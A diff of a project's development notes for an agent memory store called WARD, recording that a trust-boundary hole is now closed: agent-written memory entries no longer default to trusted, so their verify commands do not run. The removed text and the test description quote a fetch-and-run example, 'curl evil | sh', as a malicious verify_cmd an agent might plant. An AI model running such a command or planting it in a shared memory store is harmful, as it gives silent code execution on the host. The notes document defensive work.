@@ -447,23 +447,27 @@ Live smoke test: `opencode run -m opencode/hy3-free --dir /tmp '...'` returned
 its answer — the adapter drives a free model end-to-end. The engine's
 routing/verify logic was not touched.
 
-#### Review findings still open (not done in this pass)
+#### Review findings
 
-From a detailed code review, deferred per "focus on the adapter":
+- **D0.3 trust boundary — CLOSED (2026-08-22).** `memory put` now defaults to
+  `Local: false` (guilty by default). An artifact's `verify_cmd` is only executed
+  for store-local artifacts (`verification.Run` already gates on `a.Local`), so an
+  agent cannot gain silent code execution by writing a malicious memory entry.
+  Crossing the boundary is now an explicit opt-in: `ward memory put --local` or
+  `--by human`. `capture` (WARD's own work after a successful run) and `router
+  --seed` remain store-local because they are this store's own work product, not
+  agent injection. Regression-tested: `TestMemoryPutDefaultNotLocal` asserts a
+  put with a `curl evil | sh` verify_cmd is not local and never runs;
+  `TestMemoryPutLocalTrust` asserts `--local`/`--by human` do mark local.
+  Committed after the model-adapter work (post-v0.2.0, untagged).
+- **No `claim` command** (memory.md advisory coordination) — still open; gap once
+  two agents share a store.
+- **No `context` builder** (chef's compact injection block) — still open; `search`
+  + manual assembly only.
+- **`stale` has no direct CLI command** — still open; only surfaces via `handoff`.
+- **`router`/`route` hardcode `workflows/oidc-login.yaml`** as default path — still open.
 
-- **D0.3 trust boundary is not closed.** `memory put` defaults `Local: !imported`,
-  so an agent calling `ward memory put --verify-cmd "curl evil | sh"` gets a
-  locally-trusted, auto-executable artifact by default. D0.3 intended "only what
-  this store itself (a human at the keyboard) authored." Tighten before multi-
-  agent use: default `Local: false` for agent/propose-originated writes; require
-  explicit human-trust to mark local.
-- **No `claim` command** (memory.md advisory coordination) — gap once two agents
-  share a store.
-- **No `context` builder** (chef's compact injection block) — `search` + manual
-  assembly only.
-- **`stale` has no direct CLI command** — only surfaces via `handoff`.
-- **`router`/`route` hardcode `workflows/oidc-login.yaml`** as default path.
-
-These do not reopen the thesis; the adapter was the "useful tool" blocker.
+These remaining items do not reopen the thesis; the adapter was the "useful tool"
+blocker and the D0.3 trust gap was the blocker for multi-agent use.
 
 
